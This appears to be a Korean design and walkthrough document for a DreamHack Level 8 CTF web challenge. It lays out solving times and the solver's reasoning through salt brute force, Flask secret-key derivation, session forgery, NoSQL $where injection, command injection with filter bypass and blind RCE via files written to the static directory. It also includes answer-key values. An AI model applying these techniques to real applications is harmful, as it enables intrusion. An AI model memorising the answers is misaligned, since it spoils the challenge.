| Stage 1: API Enumeration | 15분 | 45분 | 서비스 발견, 엔드포인트 찾기 |
| **Stage 2: Salt 브루트포스** | **25분** | **70분** | 힌트 분석, 스크립트, 브루트포스 |
| **Stage 3: Secret Key 유도** | **10분** | **80분** | Flask 구조 추론, 패턴 분석 |
| Stage 4: 세션 위조 | 10분 | 90분 | flask-unsign 사용 |
| Stage 5: Admin API 탐색 | 10분 | 100분 | 논리적 추론으로 경로 발견 |
| Stage 6: NoSQL Injection | 20분 | 120분 | NoSQL 테스트, $where 발견 |
| Stage 7: RCE → FLAG | 15분 | **135분** | Command Injection, FLAG |

**총 풀이 시간: 약 130-140분 (2시간 10분)** - **DreamHack Level 8**

### 경로 B: BLIND_RCE=true (Blind RCE)

| 단계 | 시간 | 누적 시간 | 주요 활동 |
|------|------|----------|----------|
| Stage 0: 초기 정찰 | 10분 | 10분 | 브라우저, HTML, robots.txt |
| Red Herring (낭비) | 20분 | 30분 | 로그인, SQL/NoSQL 시도 |
| Stage 1: API Enumeration | 15분 | 45분 | 서비스 발견, 엔드포인트 찾기 |
| **Stage 2: Salt 브루트포스** | **25분** | **70분** | 힌트 분석, 스크립트, 브루트포스 |
| **Stage 3: Secret Key 유도** | **10분** | **80분** | Flask 구조 추론, 패턴 분석 |
| Stage 4: 세션 위조 | 10분 | 90분 | flask-unsign 사용 |
| Stage 5: Admin API 탐색 | 10분 | 100분 | 논리적 추론으로 경로 발견 |
| Stage 6: NoSQL Injection | 20분 | 120분 | NoSQL 테스트, $where 발견 |
| **Stage 6.5: Blind RCE 우회** | **25분** | **145분** | Time-based, File-based 우회 |

**총 풀이 시간: 약 140-150분 (2시간 30분)** - **DreamHack Level 8+**

> **차이점**: BLIND_RCE=true 환경에서는 출력을 볼 수 없어 Time-based 확인, 파일 기반 우회 등 추가 단계가 필요하므로 약 10-15분 더 소요됩니다.

### Level 6-7 vs Level 8 비교

| 요소 | Level 6-7 (이전) | Level 8 (현재) | 추가 시간 |
|------|------------------|----------------|-----------|
| **Salt 획득** | 직접 반환 (5분) | 브루트포스 (25분) | **+20분** |
| **Secret Key** | 힌트 제공 (즉시) | 직접 추론 (10분) | **+10분** |
| **NoSQL 힌트** | 에러 메시지 | 직접 테스트 | **+5분** |
| **Red Herring** | 약함 (15분) | 강함 (20분) | **+5분** |
| **정보 노출** | robots.txt, HTML | 최소화 | **+5분** |
| **총 풀이 시간** | **95분** | **135분** | **+40분** |

---

## 🧠 참가자의 핵심 사고과정

### 1. 초기 정찰의 중요성
> "일단 모든 페이지를 둘러보고, HTML 소스도 확인하고, robots.txt도 체크한다."

### 2. Red Herring 식별
> "15분 동안 /admin/login을 시도했지만 계속 실패. HTML 주석에 'See /api/auth/*' 힌트를 다시 보고 방향 전환."

### 3. API 패턴 인식 (시행착오)
> "/api/v2/services가 있고 서비스 이름이 주어졌다.
> 먼저 /api/v2/services/auth를 시도 → 404
> 그럼 RESTful 패턴으로 /endpoints, /info, /methods 등을 시도해보자 → 성공!"

### 4. 브루트포스 전략 (Level 8 핵심) ⭐
> "Salt가 직접 주어지지 않는다. 하지만 힌트가 있다:
> - format: dictionary_word + number
> - length: 7
> - md5_prefix: 4e0210
>
> 일반적인 단어로 워드리스트를 만들고, 하나씩 시도하면 된다!
> 32번 시도만에 'insane2'를 발견했다!"

### 5. Secret Key 추론 (Level 8 핵심) ⭐
> "Salt를 얻었으니 이제 secret_key를 유도해야 한다.
> system_info가 제거됐지만, Flask 지식을 활용하면 된다:
>
> Flask는 보통 32자 secret_key를 사용하고, 일반적인 패턴은:
> - sha256(salt)[:32]
> - md5(salt)
>
> MD5 힌트 '4e0210'과 비교해보니 SHA256[:32]가 일치한다!
> 추론 성공: secret_key = SHA256(salt)[:32]"

### 6. 논리적 경로 추론 (Level 8 핵심) ⭐
> "Admin API 경로를 모르니까, 서비스 특성을 분석한다:
> - 마이크로서비스 + 레거시 → 마이그레이션 개념
> - 데이터베이스 관련 기능 → /api/admin/db/migrate
>
> 논리적 추론으로 정확한 경로를 찾았다!"

### 7. 취약점 체이닝
> "NoSQL Injection ($where) → 다른 코드 경로 → log_file 파라미터 발견 → Command Injection"

### 8. Blind RCE 대응 (BLIND_RCE=true인 경우)
> "출력이 안 보인다... 하지만 'mode: advanced'가 나온다는 건 뭔가 실행되고 있다는 뜻이다.
>
> Time-based로 확인: sleep 5 → 5초 걸림 → 명령어 실행 확인!
>
> 이제 우회 방법:
> 1. 외부 서버로 전송? (없음)
> 2. 파일로 저장 후 웹 접근? (가능!)
>
> `/flag.txt > /app/static/flag.txt` → 성공!"

### 9. 페이로드 정제
> "필터를 우회하려면 세미콜론을 사용. env 명령으로 환경변수에서 FLAG 발견!"

---

## 🎓 학습 포인트 (Level 8)

### 참가자가 배우는 것:

1. **정찰 기술**
   - HTML 소스 분석
   - robots.txt 확인
   - API 패턴 인식

2. **Red Herring 식별**
   - 막힌 경로는 빠르게 포기
   - 힌트를 다시 읽고 방향 전환

3. **브루트포스 기술** ⭐ (Level 8 핵심)
   - 힌트 분석 능력
   - 워드리스트 생성 전략
   - 효율적인 탐색 알고리즘
   - MD5 검증으로 후보 확인

4. **암호학적 추론** ⭐ (Level 8 핵심)
   - Flask 세션 구조 이해
   - 일반적인 crypto 패턴 인식
   - SHA256 vs MD5 관계 분석
   - secret_key 유도 패턴 (sha256(salt)[:32])

5. **논리적 추론** ⭐ (Level 8 핵심)
   - 서비스 특성 분석
   - RESTful API 패턴 인식
   - 마이크로서비스 아키텍처 이해
   - 경로 추론 능력 (/api/admin/db/migrate)

6. **공격 체이닝**
   - Salt 힌트 → 브루트포스 → Secret Key
   - 세션 위조 → Admin 권한
   - NoSQL Injection → RCE 트리거
   - Command Injection → FLAG

7. **Flask 보안**
   - secret_key의 중요성
   - SecureCookie의 동작 방식
   - 세션 위조 기법

8. **NoSQL 보안**
   - $where 연산자의 위험성
   - JavaScript 실행 가능성 테스트
   - 입력 검증의 중요성

9. **Command Injection**
   - Shell 명령어 체이닝
   - 필터 우회 (세미콜론)
   - 환경변수에서 FLAG 찾기

10. **Blind RCE 우회** (BLIND_RCE=true인 경우)
   - Time-based 기법으로 실행 확인
   - Out-of-Band 데이터 유출
   - File-based 우회 (웹 접근 가능 경로)
   - Blind 환경에서의 창의적 사고

---

## 완료! 🎊

이 풀이 과정은 **DreamHack Level 8** 난이도에 적합하며,
참가자가 다음 스킬을 모두 사용해야 합니다:

✅ 웹 정찰 및 Red Herring 식별
✅ API 패턴 분석
✅ **브루트포스 기술** (Level 8)
✅ **암호학적 추론** (Level 8)
✅ Flask 세션 위조
✅ **논리적 경로 추론** (Level 8)
✅ NoSQL Injection
✅ Command Injection
✅ Blind RCE 우회 (BLIND 모드)

**예상 풀이 시간: 130-150분 (2-2.5 시간)**
**난이도: DreamHack Level 8 ⭐⭐⭐⭐⭐**
